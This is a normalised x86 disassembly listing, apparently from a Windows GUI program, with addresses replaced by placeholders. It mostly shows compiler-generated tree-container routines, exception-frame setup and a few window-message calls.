cmp ebp [ edi + 0x18 ]
jne r-xdata
lea eax [ ebp + 0x10 ]
mov ecx [ esp + 0x64 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x5c
retn 0x4
call sub_4407b7
sub_424ee0
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
call sub_4407b7
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ esi + 0x4 ] eax
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov eax [ eax + 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
retn
jmp sub_4407b7
mov ecx [ esi + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
lea ecx [ ecx ]
mov [ esi + 0x4 ] ecx
retn
mov ecx eax
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov [ esi + 0x4 ] eax
jmp sub_4407b7
mov [ esi + 0x4 ] eax
mov edx eax
mov eax [ edx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
sub_424f60
or eax 0xffffffff
xor edx edx
div ecx
sub esp 0x10
cmp eax 0x18
jae r-xdata
lea edx [ ecx + ecx * 2 ]
add edx edx
add edx edx
add edx edx
push edx
call sub_43fa1d
add esp 0x4
add esp 0x10
retn
lea eax [ esp ]
push eax
lea ecx [ esp + 0x8 ]
mov [ esp + 0x4 ] 0x0
call sub_43fa93
push r--data
lea ecx [ esp + 0x8 ]
push ecx
mov [ esp + 0xc ] r--data
call sub_442eab
sub_424fc0
mov ecx 0x1
call sub_424f60
test eax eax
je r-xdata
retn 0x10
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] ecx
mov ecx [ esp + 0xc ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
mov edx [ esi ]
mov [ eax + 0xc ] edx
mov ecx [ esi + 0x4 ]
mov dl [ esp + 0x10 ]
mov [ eax + 0x10 ] ecx
mov [ eax + 0x14 ] dl
mov [ eax + 0x15 ] 0x0
sub_425000
push 0xffffffff
push sub_459b68
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
push ebx
push ebp
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0x68 ]
xor ebx ebx
cmp [ ebp + 0x1c ] 0x1ffffffe
jb r-xdata
mov eax [ ebp + 0x18 ]
mov esi [ esp + 0x74 ]
push ebx
push eax
push edi
push eax
call sub_424fc0
inc [ ebp + 0x1c ]
mov esi eax
mov eax [ ebp + 0x18 ]
mov [ esp + 0x68 ] esi
cmp edi eax
jne r-xdata
push 0x13
push r--data
lea ecx [ esp + 0x1c ]
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] ebx
mov [ esp + 0x20 ] bl
call sub_42a180
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x34 ]
mov [ esp + 0x64 ] ebx
call sub_4296c0
push r--data
lea ecx [ esp + 0x34 ]
push ecx
mov [ esp + 0x38 ] r--data
call sub_442eab
cmp [ esp + 0x70 ] bl
je r-xdata
mov [ eax + 0x4 ] esi
mov edx [ ebp + 0x18 ]
mov [ edx ] esi
mov eax [ ebp + 0x18 ]
jmp r-xdata
mov [ edi + 0x8 ] esi
mov eax [ ebp + 0x18 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ edi ] esi
mov eax [ ebp + 0x18 ]
cmp edi [ eax ]
jne r-xdata
mov [ eax + 0x8 ] esi
mov ecx [ esi + 0x4 ]
lea eax [ esi + 0x4 ]
cmp [ ecx + 0x14 ] bl
jne r-xdata
mov [ eax ] esi
jmp r-xdata
mov edx [ ebp + 0x18 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x14 ] 0x1
mov eax [ esp + 0x6c ]
mov ecx [ ebp ]
mov [ eax + 0x4 ] esi
mov [ eax ] ecx
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebp
pop ebx
add esp 0x54
retn 0x10
jmp r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov edx [ edx ]
cmp [ edx + 0x14 ] bl
jne r-xdata
mov edx [ edx + 0x8 ]
cmp [ edx + 0x14 ] bl
je r-xdata
cmp esi [ ecx ]
jne r-xdata
mov [ ecx + 0x14 ] 0x1
mov [ edx + 0x14 ] 0x1
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x14 ] bl
mov edx [ eax ]
mov esi [ edx + 0x4 ]
jmp r-xdata
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ esi + 0x4 ]
mov [ eax + 0x14 ] 0x1
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x14 ] bl
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
mov edx [ ecx ]
mov [ eax + 0x8 ] edx
mov edx [ ecx ]
cmp [ edx + 0x15 ] bl
jne r-xdata
push ebp
mov esi ecx
call sub_4261c0
mov ecx [ esi + 0x4 ]
lea eax [ esi + 0x4 ]
cmp [ ecx + 0x14 ] bl
je r-xdata
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x1
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x14 ] bl
mov edx [ eax ]
mov eax [ edx + 0x4 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
mov [ eax ] edx
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x15 ] bl
jne r-xdata
mov esi ecx
mov ecx [ esi + 0x8 ]
mov eax [ ecx ]
mov [ esi + 0x8 ] eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] bl
jne r-xdata
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x18 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov esi [ esp + 0x68 ]
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x18 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov edx [ esi + 0x4 ]
lea eax [ esi + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x18 ]
cmp esi [ edx + 0x4 ]
jne r-xdata
mov [ eax + 0x4 ] esi
mov edx [ eax + 0x4 ]
cmp eax [ edx ]
jne r-xdata
mov [ edx + 0x4 ] ecx
jmp r-xdata
mov edx [ eax + 0x4 ]
cmp eax [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov edx [ eax ]
cmp esi [ edx ]
jne r-xdata
mov [ edx + 0x4 ] ecx
jmp r-xdata
mov [ edx + 0x8 ] ecx
mov [ edx ] ecx
jmp r-xdata
mov [ ecx ] eax
mov [ edx ] ecx
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov [ eax + 0x4 ] ecx
mov [ edx + 0x8 ] ecx
mov [ edx ] ecx
jmp r-xdata
mov [ ecx ] esi
mov [ eax ] ecx
sub_425250
sub esp 0x10
push ebp
mov ebp [ esp + 0x18 ]
push esi
push edi
mov edi [ ebx + 0x18 ]
mov eax [ edi + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov cl 0x1
mov [ esp + 0x20 ] cl
jne r-xdata
mov eax [ ebx ]
mov edx edi
mov [ esp + 0x14 ] edx
mov [ esp + 0x10 ] eax
test cl cl
je r-xdata
mov ecx [ esp + 0x24 ]
mov edx [ ecx ]
mov esi [ edx + 0xc ]
mov ecx [ esp + 0x24 ]
cmp esi [ ecx ]
jae r-xdata
mov edx [ ebx + 0x18 ]
mov esi [ edx ]
test eax eax
je r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
jmp r-xdata
pop edi
mov [ ebp ] eax
pop esi
mov [ ebp + 0x8 ] 0x0
mov [ ebp + 0x4 ] edx
mov eax ebp
pop ebp
add esp 0x10
retn 0x8
push ecx
mov ecx [ esp + 0x24 ]
push ecx
lea edx [ esp + 0x18 ]
push edx
push ebx
call sub_425000
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ ebp ] ecx
mov [ ebp + 0x8 ] 0x1
mov [ ebp + 0x4 ] edx
mov eax ebp
pop edi
pop esi
pop ebp
add esp 0x10
retn 0x8
call sub_4407b7
cmp eax eax
je r-xdata
cmp edx [ eax + 0xc ]
mov edi eax
setb cl
mov [ esp + 0x20 ] cl
test cl cl
je r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
lea esi [ esp + 0x10 ]
call sub_424ee0
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov eax [ esp + 0x24 ]
push eax
push 0x1
lea ecx [ esp + 0x18 ]
push ecx
push ebx
call sub_425000
mov edx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x4 ] eax
mov [ ebp ] edx
mov [ ebp + 0x8 ] 0x1
mov eax ebp
pop edi
pop esi
pop ebp
add esp 0x10
retn 0x8
cmp edi esi
jne r-xdata
sub_425340
sub esp 0x1c
push ebx
push ebp
mov ebp [ esp + 0x28 ]
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
push esi
push edi
jne r-xdata
mov ecx [ ebx + 0x18 ]
mov esi [ ecx ]
mov ecx [ esp + 0x38 ]
mov eax [ ebx ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x34 ]
mov edi [ ebx + 0x18 ]
push eax
push 0x1
push ebp
push ebx
call sub_425000
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x10
call sub_4407b7
mov ecx [ esp + 0x38 ]
cmp ecx eax
je r-xdata
mov esi [ ebx + 0x18 ]
mov edx [ ebx ]
test ecx ecx
je r-xdata
mov ecx [ esp + 0x34 ]
mov edx [ ecx ]
cmp edx [ eax + 0xc ]
jae r-xdata
mov eax [ esp + 0x3c ]
cmp eax esi
jne r-xdata
call sub_4407b7
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x38 ]
cmp ecx edx
je r-xdata
push ecx
lea ecx [ esp + 0x20 ]
push ecx
call sub_425250
mov edx [ eax ]
mov [ ebp ] edx
mov eax [ eax + 0x4 ]
pop edi
mov [ ebp + 0x4 ] eax
pop esi
mov eax ebp
pop ebp
pop ebx
add esp 0x1c
retn 0x10
push ecx
push 0x1
push ebp
push ebx
mov edi eax
call sub_425000
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x10
mov edi [ esp + 0x34 ]
mov edx [ edi ]
cmp [ eax + 0xc ] edx
jbe r-xdata
mov eax [ ebx + 0x18 ]
mov edi [ eax + 0x8 ]
mov ecx [ edi + 0xc ]
mov edx [ esp + 0x34 ]
cmp ecx [ edx ]
jae r-xdata
cmp eax esi
jne r-xdata
jae r-xdata
lea esi [ esp + 0x14 ]
mov [ esp + 0x14 ] ecx
mov [ esp + 0x18 ] eax
call sub_424ee0
mov edx [ edi ]
mov eax [ esp + 0x18 ]
cmp [ eax + 0xc ] edx
jae r-xdata
mov ecx [ esp + 0x34 ]
mov eax edx
push eax
push 0x0
push ebp
push ebx
call sub_425000
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x10
mov edx [ ebx + 0x18 ]
mov [ esp + 0x18 ] eax
mov eax [ ebx ]
lea esi [ esp + 0x14 ]
mov [ esp + 0x14 ] ecx
mov [ esp + 0x20 ] edx
mov [ esp + 0x1c ] eax
call sub_4264e0
lea esi [ esp + 0x1c ]
lea edi [ esp + 0x14 ]
call sub_4105a0
mov edi [ esp + 0x18 ]
test al al
jne r-xdata
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x38 ]
cmp [ eax + 0xc ] edx
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
push edi
jne r-xdata
mov eax [ esp + 0x3c ]
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov ecx [ esp + 0x34 ]
mov edx [ ecx ]
cmp edx [ edi + 0xc ]
jae r-xdata
push 0x0
push ebp
push ebx
mov edi eax
call sub_425000
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x10
mov edi [ esp + 0x40 ]
push 0x1
push ebp
push ebx
call sub_425000
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x10
mov eax [ esp + 0x34 ]
push eax
push 0x1
push ebp
push ebx
call sub_425000
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x10
mov edx [ esp + 0x34 ]
push edx
sub_425510
mov ecx [ ebx + 0x18 ]
mov eax [ ecx + 0x4 ]
sub esp 0x14
cmp [ eax + 0x15 ] 0x0
push ebp
push esi
push edi
mov edi ecx
jne r-xdata
mov esi [ ebx ]
mov ebp [ ebx + 0x18 ]
test esi esi
je r-xdata
mov ecx [ esp + 0x24 ]
mov ecx [ ecx ]
lea ebx [ ebx ]
call sub_4407b7
cmp esi esi
je r-xdata
mov edi eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0x24 ]
mov edx [ ecx ]
push edi
push esi
lea eax [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x24 ]
push ecx
mov eax ebx
mov [ esp + 0x20 ] edx
mov [ esp + 0x24 ] 0x0
call sub_425340
mov esi [ eax ]
mov edi [ eax + 0x4 ]
mov edx [ esp + 0x24 ]
mov eax [ edx ]
cmp eax [ edi + 0xc ]
jae r-xdata
cmp edi ebp
je r-xdata
cmp [ eax + 0xc ] ecx
jae r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov esi [ esi ]
jmp r-xdata
call sub_4407b7
test esi esi
jne r-xdata
cmp edi [ esi + 0x18 ]
jne r-xdata
lea eax [ edi + 0x10 ]
pop edi
pop esi
pop ebp
add esp 0x14
retn 0x4
call sub_4407b7
sub_4255c0
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
sub esp 0x54
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push eax
push ecx
mov eax edi
call sub_423da0
test eax eax
je r-xdata
mov [ esp + 0x14 ] 0x1
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
call sub_4407b7
cmp eax esi
je r-xdata
lea ecx [ esp + 0x10 ]
push ecx
mov ebx edi
call sub_424430
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax ] edx
test ecx ecx
jne r-xdata
inc [ esp + 0x14 ]
jmp r-xdata
mov eax [ esp + 0x1c ]
cmp [ ebx + 0x4 ] eax
je r-xdata
mov esi [ ecx ]
mov [ eax + 0x8 ] esi
mov esi [ ecx + 0x4 ]
mov [ eax + 0xc ] esi
mov esi [ ecx + 0x8 ]
mov [ eax + 0x10 ] esi
mov esi [ ecx + 0xc ]
mov [ eax + 0x14 ] esi
mov eax [ ecx ]
mov [ esp + 0x20 ] eax
mov eax [ ecx + 0x4 ]
mov [ esp + 0x24 ] eax
mov eax [ ecx + 0x8 ]
mov ecx [ ecx + 0xc ]
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] ecx
mov eax [ edx + 0x10 ]
mov ecx [ edx + 0xc ]
push eax
push ecx
mov [ eax + 0x8 ] 0x80000000
mov eax [ edx + 0xc ]
mov [ esp + 0x20 ] eax
mov ecx [ edx + 0x10 ]
mov [ esp + 0x24 ] ecx
mov eax [ edx + 0x14 ]
mov [ esp + 0x28 ] eax
mov ecx [ edx + 0x18 ]
push 0x0
mov [ esp + 0x30 ] ecx
push 0x0
jmp r-xdata
mov edx [ esp + 0x14 ]
mov eax [ edi + 0x18 ]
mov esi [ edi ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10 ] edx
push ecx
lea edx [ esp + 0x24 ]
push edx
mov [ esp + 0x24 ] eax
call sub_426e70
mov ebx eax
mov eax [ ebx ]
test eax eax
je r-xdata
pop edi
pop esi
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov edx [ edi + 0x44 ]
push 0xffffffff
push edx
lea ebx [ esp + 0x28 ]
mov edi ecx
lea esi [ esp + 0x38 ]
call sub_425dd0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x40 ]
mov eax esi
push eax
push 0x0
push 0x432
push edx
call [ SendMessageW@IAT ]
mov ecx edi
lea edx [ esp + 0x28 ]
push edx
call [ OffsetRect@IAT ]
lea eax [ ebp + 0xc ]
push eax
lea ecx [ edi + 0x20 ]
call sub_424dc0
lea ecx [ ebp + 0x10 ]
push ecx
mov ebx eax
call sub_425510
mov ecx [ esp + 0x10 ]
mov [ eax ] ecx
cmp [ edi + 0x40 ] 0x0
je r-xdata
sub_425740
mov ecx [ edi + 0x18 ]
mov eax [ ecx + 0x4 ]
sub esp 0x18
cmp [ eax + 0x31 ] 0x0
push ebx
push ebp
mov ebp [ esp + 0x28 ]
push esi
mov esi ecx
jne r-xdata
mov eax [ edi ]
mov ebx [ edi + 0x18 ]
mov [ esp + 0x14 ] esi
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
mov ecx [ ebp ]
jmp r-xdata
call sub_4407b7
cmp eax eax
je r-xdata
cmp [ eax + 0xc ] ecx
jae r-xdata
mov ecx [ edi + 0x18 ]
mov edx [ edi ]
mov [ esp + 0x1c ] ecx
mov [ esp + 0x18 ] edx
lea eax [ esp + 0x18 ]
mov eax [ ebp ]
cmp eax [ esi + 0xc ]
jb r-xdata
cmp esi ebx
je r-xdata
mov esi eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
lea eax [ esp + 0x10 ]
jmp r-xdata
cmp [ eax + 0x31 ] 0x0
je r-xdata
mov edx [ eax ]
mov ecx [ esp + 0x28 ]
mov eax [ eax + 0x4 ]
pop esi
pop ebp
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebx
add esp 0x18
retn 0x8
sub_4257d0
push ebx
push ebp
mov ebp [ esp + 0xc ]
mov edx [ ebp + 0x18 ]
mov ecx [ edx + 0x4 ]
cmp [ ecx + 0x29 ] 0x0
push esi
push edi
mov ebx edx
jne r-xdata
cmp [ edx + 0x29 ] 0x0
je r-xdata
mov esi [ esp + 0x18 ]
mov edi [ esi ]
lea esp [ esp ]
mov ecx [ edx ]
mov ecx [ ebp + 0x18 ]
mov ecx [ ecx + 0x4 ]
jmp r-xdata
cmp [ edx + 0x29 ] 0x0
je r-xdata
mov ecx [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ ebp ]
pop edi
pop esi
pop ebp
mov [ eax + 0x4 ] ebx
mov [ eax ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] edx
pop ebx
retn 0x8
mov esi [ esp + 0x18 ]
mov esi [ esi ]
mov edi edi
cmp [ ecx + 0x29 ] 0x0
jne r-xdata
mov ebx ecx
mov ecx [ ecx ]
cmp edi esi
jae r-xdata
cmp [ ecx + 0x29 ] 0x0
je r-xdata
mov ecx [ ecx + 0x8 ]
mov edx ecx
mov ecx [ ecx ]
jmp r-xdata
mov esi [ ecx + 0xc ]
cmp esi edi
jae r-xdata
mov edx ecx
cmp esi [ ecx + 0xc ]
jae r-xdata
cmp [ ecx + 0x29 ] 0x0
je r-xdata
sub_425860
sub esp 0x10
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebx
mov ebx [ esp + 0x20 ]
push ebp
mov ebp [ esp + 0x28 ]
push esi
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] ecx
mov edi edi
call sub_4407b7
cmp eax ebx
je r-xdata
pop esi
pop ebp
pop ebx
add esp 0x10
retn
inc [ edi ]
lea esi [ esp + 0x10 ]
call sub_425c80
mov eax [ esp + 0x10 ]
jmp r-xdata
cmp [ esp + 0x14 ] ebp
je r-xdata
test eax eax
je r-xdata
sub_4258b0
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
cmp [ edi + 0x29 ] 0x0
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_4258b0
mov esi [ esi ]
push edi
call sub_43f960
add esp 0x4
cmp [ esi + 0x29 ] 0x0
mov edi esi
je r-xdata
sub_425910
mov eax [ ecx + 0x8 ]
mov edx [ eax ]
mov [ ecx + 0x8 ] edx
mov edx [ eax ]
cmp [ edx + 0x29 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ esp + 0x4 ]
mov edx [ edx + 0x18 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
mov [ edx ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
sub_425960
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov [ ecx ] edx
mov edx [ eax + 0x8 ]
cmp [ edx + 0x29 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ esp + 0x4 ]
mov edx [ edx + 0x18 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
mov [ edx ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
sub_4259b0
push 0xffffffff
push sub_459b68
mov eax [ fs : 0x0 ]
push eax
sub esp 0x44
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0x68 ]
mov eax [ esp + 0x74 ]
cmp [ eax + 0x29 ] 0x0
je r-xdata
mov ebx eax
lea esi [ esp + 0x70 ]
mov [ esp + 0x68 ] ebx
call sub_425c80
mov ecx [ ebx ]
cmp [ ecx + 0x29 ] 0x0
je r-xdata
push 0x1b
xor esi esi
push r--data
lea ecx [ esp + 0x1c ]
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] esi
mov [ esp + 0x20 ] 0x0
call sub_42a180
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x34 ]
mov [ esp + 0x64 ] esi
call sub_4296c0
push r--data
lea ecx [ esp + 0x34 ]
push ecx
mov [ esp + 0x38 ] r--data
call sub_442eab
mov edx [ ebx + 0x8 ]
cmp [ edx + 0x29 ] 0x0
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov eax [ esp + 0x74 ]
mov edi [ eax + 0x8 ]
lea edx [ eax + 0x8 ]
cmp eax ebx
jne r-xdata
mov edi ecx
jmp r-xdata
cmp [ edi + 0x29 ] 0x0
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov ecx [ ebx ]
mov [ eax ] ecx
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x18 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x29 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov ecx [ ebx + 0x8 ]
mov [ edx ] ecx
mov edx [ ebx + 0x8 ]
mov [ edx + 0x4 ] eax
mov [ edi + 0x4 ] esi
mov ecx [ ebp + 0x18 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov edx [ ebp + 0x18 ]
cmp [ edx ] ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
cmp [ ecx ] ebx
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ebx [ ebp + 0x18 ]
mov eax [ esp + 0x68 ]
cmp [ ebx + 0x8 ] eax
jne r-xdata
cmp [ edi + 0x29 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov ecx [ ebx + 0x4 ]
mov [ eax + 0x4 ] ecx
lea ecx [ ebx + 0x28 ]
add eax 0x28
cmp eax ecx
je r-xdata
mov edx [ esp + 0x68 ]
mov bl 0x1
cmp [ edx + 0x28 ] bl
jne r-xdata
cmp [ edi + 0x29 ] 0x0
je r-xdata
mov eax [ edi ]
cmp [ eax + 0x29 ] 0x0
mov ecx edi
jne r-xdata
mov ecx esi
jmp r-xdata
mov bl [ ecx ]
mov dl [ eax ]
mov [ eax ] bl
mov [ ecx ] dl
mov ecx [ esp + 0x68 ]
push ecx
call sub_43f960
mov eax [ ebp + 0x1c ]
add esp 0x4
test eax eax
jbe r-xdata
mov eax [ ebp + 0x18 ]
cmp edi [ eax + 0x4 ]
je r-xdata
mov eax edi
call sub_4258f0
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov [ edx ] ecx
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x29 ] 0x0
je r-xdata
mov edx [ esp + 0x6c ]
mov eax [ esp + 0x74 ]
mov ecx [ ebp ]
mov [ edx + 0x4 ] eax
mov [ edx ] ecx
mov eax edx
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x50
retn 0x10
dec eax
mov [ ebp + 0x1c ] eax
mov [ edi + 0x28 ] bl
nop
mov ecx [ esi ]
cmp edi ecx
jne r-xdata
cmp [ ecx + 0x28 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x28 ] 0x0
jne r-xdata
cmp [ ecx + 0x29 ] 0x0
jne r-xdata
mov [ ecx + 0x28 ] bl
push ebp
mov ecx esi
mov [ esi + 0x28 ] 0x0
call sub_425960
mov ecx [ esi ]
cmp [ ecx + 0x29 ] 0x0
jne r-xdata
mov [ ecx + 0x28 ] bl
push ebp
mov ecx esi
mov [ esi + 0x28 ] 0x0
call sub_425910
mov ecx [ esi + 0x8 ]
mov ecx [ ebp + 0x18 ]
mov edi esi
mov esi [ esi + 0x4 ]
cmp edi [ ecx + 0x4 ]
jne r-xdata
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x28 ] bl
jne r-xdata
mov edx [ ecx ]
cmp [ edx + 0x28 ] bl
jne r-xdata
cmp [ edi + 0x28 ] bl
jne r-xdata
jmp r-xdata
mov edx [ ecx ]
cmp [ edx + 0x28 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x28 ] bl
jne r-xdata
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x28 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x28 ] bl
je r-xdata
mov dl [ esi + 0x28 ]
mov [ ecx + 0x28 ] dl
mov [ esi + 0x28 ] bl
mov eax [ ecx ]
push ebp
mov ecx esi
mov [ eax + 0x28 ] bl
call sub_425960
mov eax [ ecx + 0x8 ]
mov [ eax + 0x28 ] bl
push ebp
mov [ ecx + 0x28 ] 0x0
call sub_425910
mov ecx [ esi ]
mov [ ecx + 0x28 ] 0x0
mov dl [ esi + 0x28 ]
mov [ ecx + 0x28 ] dl
mov [ esi + 0x28 ] bl
mov eax [ ecx + 0x8 ]
push ebp
mov ecx esi
mov [ eax + 0x28 ] bl
call sub_425910
jmp r-xdata
mov eax [ ecx ]
mov [ eax + 0x28 ] bl
push ebp
mov [ ecx + 0x28 ] 0x0
call sub_425960
mov ecx [ esi + 0x8 ]
sub_425c80
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x29 ] 0x0
je r-xdata
call sub_4407b7
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x29 ] 0x0
jne r-xdata
jmp sub_4407b7
mov eax [ eax + 0x4 ]
cmp [ eax + 0x29 ] 0x0
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x29 ] 0x0
jne r-xdata
mov [ esi + 0x4 ] eax
retn
mov ecx [ esi + 0x4 ]
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
retn
lea esp [ esp ]
mov [ esi + 0x4 ] eax
mov edx eax
mov eax [ edx + 0x4 ]
cmp [ eax + 0x29 ] 0x0
je r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x29 ] 0x0
